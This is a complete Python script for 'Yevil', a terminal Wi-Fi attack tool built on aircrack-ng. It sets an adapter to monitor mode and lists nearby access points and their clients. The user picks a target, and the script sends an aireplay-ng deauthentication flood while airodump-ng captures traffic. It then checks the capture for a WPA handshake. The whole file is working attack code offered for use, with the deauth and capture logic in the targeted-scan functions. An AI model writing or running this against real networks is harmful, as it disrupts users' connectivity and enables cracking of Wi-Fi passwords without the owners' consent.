#!/usr/bin/env python3
"""
Yevil - Real‑time WiFi Scanner v2.8.0
- Curses TUI for live scanning.
- Persistent AP summary after exit.
- Select AP for focused scan + deauth attack + handshake detection.
- Deauth progress shown in a clean curses window (no scrolling).
- Shows adapter interface with driver/bus info.
- Auto reset monitor mode after scan.
"""

import os
import sys
import subprocess
import re
import time
import glob
import curses
from collections import defaultdict

# ============================================
# GLOBALS
# ============================================

MONITOR_INTERFACE = None
SCANNER_PROCESS = None
CSV_PREFIX = "/tmp/yevil_scan"

networks = {}               # bssid -> {ssid, bssid, power, channel, encryption}
clients = defaultdict(set)  # bssid -> set of station MACs

# ============================================
# CLEANUP & UTILITIES
# ============================================

def cleanup_files():
    for f in glob.glob(f"{CSV_PREFIX}*"):
        try:
            os.remove(f)
        except:
            pass


def cleanup():
    global SCANNER_PROCESS
    if SCANNER_PROCESS:
        try:
            SCANNER_PROCESS.terminate()
            time.sleep(0.3)
            if SCANNER_PROCESS.poll() is None:
                SCANNER_PROCESS.kill()
        except:
            pass
        SCANNER_PROCESS = None
    cleanup_files()


def reset_adapter():
    global MONITOR_INTERFACE
    if MONITOR_INTERFACE:
        try:
            subprocess.run(['ip', 'link', 'set', MONITOR_INTERFACE, 'down'], capture_output=True)
            subprocess.run(['iw', 'dev', MONITOR_INTERFACE, 'set', 'type', 'managed'], capture_output=True)
            subprocess.run(['ip', 'link', 'set', MONITOR_INTERFACE, 'up'], capture_output=True)
            subprocess.run(['systemctl', 'restart', 'NetworkManager'], capture_output=True)
            print(f"[+] Restored {MONITOR_INTERFACE} to managed mode.")
        except:
            pass


def get_adapter_info(iface):
    """Return a human-readable description of the adapter."""
    description = iface

    if 'mon' in iface:
        return iface + " (monitor)"

    try:
        dev_path = os.path.realpath(f"/sys/class/net/{iface}/device")
        is_usb = "usb" in dev_path

        driver = ""
        try:
            res = subprocess.run(['ethtool', '-i', iface], capture_output=True, text=True, timeout=2)
            for line in res.stdout.split('\n'):
                if line.startswith('driver:'):
                    driver = line.split(':')[1].strip()
                    break
        except:
            pass

        if is_usb:
            description = f"{iface} (USB"
            if driver:
                description += f" - {driver}"
            description += ")"
        else:
            description = f"{iface} (Internal)"
            if driver:
                description += f" - {driver}"

    except Exception:
        pass

    return description


def detect_adapters():
    """Return a list of dicts with 'interface' and 'description'."""
    adapters = []
    try:
        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'IEEE 802.11' in line:
                iface = line.split()[0]
                if 'mon' not in iface:
                    desc = get_adapter_info(iface)
                    adapters.append({'interface': iface, 'description': desc})
    except:
        pass
    return adapters


def set_monitor_mode(adapter):
    global MONITOR_INTERFACE
    try:
        subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True)
        subprocess.run(['ip', 'link', 'set', adapter, 'down'], check=True, capture_output=True)
        subprocess.run(['iw', 'dev', adapter, 'set', 'type', 'monitor'], check=True, capture_output=True)
        subprocess.run(['ip', 'link', 'set', adapter, 'up'], check=True, capture_output=True)
        MONITOR_INTERFACE = adapter
        return True
    except Exception:
        return False

# ============================================
# CSV PARSER
# ============================================

def parse_csv_file(csv_file):
    global networks, clients
    if not os.path.exists(csv_file):
        return

    temp_nets = {}
    temp_clients = defaultdict(set)

    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()

        parsing_stations = False

        for line in lines:
            line = line.strip()
            if not line:
                continue

            if line.startswith("Station MAC"):
                parsing_stations = True
                continue

            parts = [p.strip() for p in line.split(',')]

            if not parsing_stations:
                if len(parts) >= 14 and re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', parts[0]):
                    bssid = parts[0]
                    power = parts[8]
                    channel = parts[3]
                    privacy = parts[5]
                    ssid = parts[13] if parts[13] else "<Hidden>"
                    temp_nets[bssid] = {
                        'bssid': bssid,
                        'power': power,
                        'channel': channel,
                        'encryption': privacy,
                        'ssid': ssid
                    }
            else:
                if len(parts) >= 6 and re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', parts[0]):
                    client_mac = parts[0]
                    associated_bssid = parts[5]
                    if re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', associated_bssid):
                        temp_clients[associated_bssid].add(client_mac)

        networks = temp_nets
        clients = temp_clients
    except Exception:
        pass

# ============================================
# CURSES TUI (LIVE SCANNING DISPLAY)
# ============================================

def curses_display(stdscr):
    curses.curs_set(0)
    stdscr.nodelay(True)
    stdscr.timeout(400)

    curses.start_color()
    curses.use_default_colors()
    curses.init_pair(1, curses.COLOR_GREEN, -1)
    curses.init_pair(2, curses.COLOR_YELLOW, -1)
    curses.init_pair(3, curses.COLOR_RED, -1)
    curses.init_pair(4, curses.COLOR_CYAN, -1)

    target_csv = f"{CSV_PREFIX}-01.csv"

    while True:
        key = stdscr.getch()
        if key in (ord('q'), ord('Q'), 3):
            break

        parse_csv_file(target_csv)
        stdscr.erase()

        max_y, max_x = stdscr.getmaxyx()

        title = "=== YEVIL - REAL-TIME WI-FI SCANNER ==="
        stdscr.addstr(0, max(0, (max_x - len(title)) // 2), title, curses.color_pair(4) | curses.A_BOLD)

        header = f"{'NUM':<4} {'ESSID':<28} {'CH':<4} {'ENCR':<8} {'POWER':<8} {'CLIENTS':<7} {'BSSID'}"
        stdscr.addstr(2, 0, header[:max_x - 1], curses.color_pair(4) | curses.A_BOLD)
        stdscr.addstr(3, 0, "-" * min(max_x - 1, 80), curses.color_pair(4))

        def get_power(net):
            try:
                return int(net['power'])
            except:
                return -100

        sorted_nets = sorted(networks.values(), key=get_power, reverse=True)

        row_idx = 4
        for idx, net in enumerate(sorted_nets, 1):
            if row_idx >= max_y - 2:
                break
            try:
                pwr = int(net['power'])
                color = curses.color_pair(1) if pwr > -60 else curses.color_pair(2) if pwr > -75 else curses.color_pair(3)
            except:
                color = curses.color_pair(0)

            ssid = net['ssid'][:26]
            client_count = len(clients.get(net['bssid'], set()))
            pwr_str = f"{net['power']} dB" if net['power'].lstrip('-').isdigit() else net['power']

            line = f"{idx:<4} {ssid:<28} {net['channel']:<4} {net['encryption']:<8} {pwr_str:<8} {client_count:<7} {net['bssid']}"
            stdscr.addstr(row_idx, 0, line[:max_x - 1], color)
            row_idx += 1

        footer = "Press 'q' or Ctrl+C to stop scanning and freeze network list."
        stdscr.addstr(max_y - 1, 0, footer[:max_x - 1], curses.color_pair(4) | curses.A_REVERSE)

        stdscr.refresh()

# ============================================
# PERSISTENT POST-EXIT SUMMARY
# ============================================

def print_final_summary():
    if not networks:
        print("\n\033[91m[-] No networks discovered during scan.\033[0m")
        return

    print("\n\033[96m" + "=" * 80)
    print("                    DISCOVERED ACCESS POINTS SUMMARY".center(80))
    print("=" * 80 + "\033[0m")
    print(f"\033[1m\033[93m{'NUM':<4} {'ESSID':<28} {'CH':<4} {'POWER':<8} {'ENCR':<8} {'CLIENTS':<7} {'BSSID'}\033[0m")
    print("\033[96m" + "-" * 80 + "\033[0m")

    def get_power(net):
        try:
            return int(net['power'])
        except:
            return -100

    sorted_nets = sorted(networks.values(), key=get_power, reverse=True)

    for idx, net in enumerate(sorted_nets, 1):
        ssid = net['ssid'][:26]
        pwr_str = f"{net['power']} dB" if net['power'].lstrip('-').isdigit() else net['power']
        client_count = len(clients.get(net['bssid'], set()))
        try:
            pwr = int(net['power'])
            color_code = '\033[92m' if pwr > -60 else '\033[93m' if pwr > -75 else '\033[91m'
        except:
            color_code = '\033[97m'

        line = f"{idx:<4} {ssid:<28} {net['channel']:<4} {pwr_str:<8} {net['encryption']:<8} {client_count:<7} {net['bssid']}"
        print(f"{color_code}{line}\033[0m")

    print("\033[96m" + "=" * 80 + "\033[0m\n")

# ============================================
# DEAUTH CURSES PROGRESS
# ============================================

def deauth_curses(stdscr, bssid, channel, interface, count):
    """Curses window showing deauth progress."""
    curses.curs_set(0)
    stdscr.nodelay(True)
    stdscr.timeout(100)

    # Start the deauth process
    cmd_deauth = [
        'sudo', 'aireplay-ng',
        '-0', str(count),
        '-a', bssid,
        '--ignore-negative-one',
        interface
    ]
    proc = subprocess.Popen(cmd_deauth,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT,
                            text=True,
                            bufsize=1)

    packet_num = 0
    latest_line = "Waiting for deauth output..."
    abort = False

    while True:
        # Check for key press
        key = stdscr.getch()
        if key in (ord('q'), ord('Q'), 3):  # q or Ctrl+C
            abort = True
            proc.terminate()
            break

        # Read non‑blocking from stdout
        try:
            line = proc.stdout.readline()
            if line:
                line = line.strip()
                if line:
                    packet_num += 1
                    latest_line = line
        except:
            pass

        # Update display
        stdscr.erase()
        max_y, max_x = stdscr.getmaxyx()

        title = "=== YEVIL - DEAUTH ATTACK ==="
        stdscr.addstr(0, max(0, (max_x - len(title)) // 2), title, curses.A_BOLD | curses.color_pair(4))

        info = f"Target AP: {bssid}  |  Channel: {channel}  |  Interface: {interface}"
        stdscr.addstr(2, 2, info[:max_x - 4])

        progress = f"Packets sent: {packet_num} / {count}"
        stdscr.addstr(4, 2, progress[:max_x - 4])

        # Show latest deauth line (truncated)
        display_line = latest_line[:max_x - 6]
        stdscr.addstr(6, 2, f"Latest: {display_line}")

        # Status / instructions
        if proc.poll() is not None:
            stdscr.addstr(8, 2, "Deauth process finished.")
            break
        else:
            stdscr.addstr(8, 2, "Press 'q' to abort.")

        stdscr.refresh()
        time.sleep(0.1)

    # Wait for process to end if not already
    proc.wait()
    # Give a moment for user to see final status
    time.sleep(1)


# ============================================
# TARGETED SCAN WITH DEAUTH + HANDSHAKE DETECTION
# ============================================

def run_targeted_scan(bssid, channel, interface):
    """Launch focused scan + deauth attack (curses progress), then check for handshake."""
    try:
        count = input("[?] Number of deauth packets to send (default 20): ").strip()
        if count == "":
            count = "20"
        else:
            count = int(count)
            count = str(count)
    except ValueError:
        count = "20"
        print("[!] Invalid input, using default 20.")

    cap_prefix = f"/tmp/yevil_handshake_{bssid.replace(':', '_')}"
    cap_file = f"{cap_prefix}-01.cap"

    for f in [cap_file]:
        if os.path.exists(f):
            try:
                os.remove(f)
            except:
                pass

    # Start airodump-ng in the background
    cmd_airodump = [
        'sudo', 'airodump-ng',
        '--bssid', bssid,
        '-c', channel,
        '--write', cap_prefix,
        '--output-format', 'pcap',
        interface
    ]
    print(f"\n[+] Starting capture: {' '.join(cmd_airodump)}")
    airo_proc = subprocess.Popen(cmd_airodump, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)

    # Run deauth with curses progress
    print("[+] Launching deauth progress window...")
    curses.wrapper(deauth_curses, bssid, channel, interface, count)

    print("[+] Waiting 5 seconds for potential reconnection...")
    time.sleep(5)

    print("[+] Stopping capture...")
    airo_proc.terminate()
    time.sleep(1)
    if airo_proc.poll() is None:
        airo_proc.kill()

    if os.path.exists(cap_file):
        print(f"\n[+] Analysing {cap_file} for handshake...")
        try:
            aircmd = ['aircrack-ng', '-b', bssid, cap_file]
            result = subprocess.run(aircmd, capture_output=True, text=True)
            output = result.stdout + result.stderr

            if 'WPA (1 handshake)' in output:
                print("\033[92m\n[✅] HANDSHAKE CAPTURED SUCCESSFULLY!\033[0m")
            elif 'WPA (0 handshake)' in output:
                print("\033[93m\n[!] No handshake found in the capture.\033[0m")
            else:
                print("\n[!] Could not determine handshake status. Try longer capture or stronger deauth.")
        except Exception as e:
            print(f"[-] Error analysing capture: {e}")
    else:
        print("[-] No capture file found. Something went wrong.")

    for f in [cap_file]:
        try:
            os.remove(f)
        except:
            pass
    print("[+] Capture files cleaned up.")

# ============================================
# MAIN EXECUTION
# ============================================

def main():
    global SCANNER_PROCESS

    if os.geteuid() != 0:
        print("[-] This tool requires root privileges! Run with: sudo python3 yevil.py")
        sys.exit(1)

    adapters = detect_adapters()
    if not adapters:
        print("[-] No wireless adapters detected!")
        sys.exit(1)

    print("\n📋 Available Wireless Adapters:")
    for i, adapter in enumerate(adapters, 1):
        print(f"  {i}. {adapter['description']}")

    while True:
        try:
            choice = input("\n[?] Select adapter number: ")
            selected = adapters[int(choice) - 1]
            selected_iface = selected['interface']
            break
        except (IndexError, ValueError):
            print("[-] Invalid selection!")

    print(f"[*] Setting {selected_iface} into monitor mode...")
    if not set_monitor_mode(selected_iface):
        print("[-] Failed to set monitor mode.")
        sys.exit(1)

    cleanup_files()

    cmd = [
        'airodump-ng', selected_iface,
        '--band', 'abg',
        '--write', CSV_PREFIX,
        '--output-format', 'csv'
    ]

    SCANNER_PROCESS = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print("[*] Launching Real-time Interface...")
    time.sleep(1)

    try:
        curses.wrapper(curses_display)
    except KeyboardInterrupt:
        pass
    except Exception:
        pass
    finally:
        cleanup()

    print_final_summary()

    if networks:
        print("\n[?] Enter the number of the AP to capture a handshake (or press Enter to skip):")
        try:
            choice = input("> ").strip()
            if choice:
                idx = int(choice) - 1
                sorted_nets = sorted(networks.values(),
                                     key=lambda x: int(x['power']) if x['power'].lstrip('-').isdigit() else -100,
                                     reverse=True)
                if 0 <= idx < len(sorted_nets):
                    target = sorted_nets[idx]
                    print(f"\n[+] Targeting {target['ssid']} ({target['bssid']}) on channel {target['channel']}")
                    run_targeted_scan(target['bssid'], target['channel'], selected_iface)
                else:
                    print("[-] Invalid selection, skipping.")
        except ValueError:
            print("[-] Invalid input, skipping.")
        except KeyboardInterrupt:
            print("\n[+] Skipped.")

    # Auto reset
    print("\n[+] Restoring adapter to managed mode...")
    reset_adapter()

    print("\n[+] Done. Goodbye!")

if __name__ == "__main__":
    main()
